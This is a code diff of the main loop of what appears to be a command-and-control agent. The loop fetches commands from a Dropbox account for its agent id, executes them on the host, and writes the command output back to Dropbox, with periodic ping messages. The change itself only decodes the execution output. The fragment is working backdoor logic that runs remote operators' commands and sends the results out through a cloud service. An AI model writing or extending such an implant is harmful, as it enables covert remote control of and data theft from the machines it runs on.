@@ -34,9 +34,8 @@ if __name__ == "__main__":
     while True:
         cmd = getCommand(dbx, id)
         if cmd is not None:
-            cmd = cmd['command']
             cmd_id = cmd['timestamp']
-            exec_out = cexec.execute_command(cmd['kind'], cmd['args'])
+            exec_out = cexec.execute_command(cmd['kind'], cmd['args']).decode()
             cclog.log_append(dbx, '/' + id, cpayload.done_create(cmd_id, exec_out))
         time.sleep(sleep_time)
         cclog.log_append(dbx, '/' + id, cpayload.ping_create())
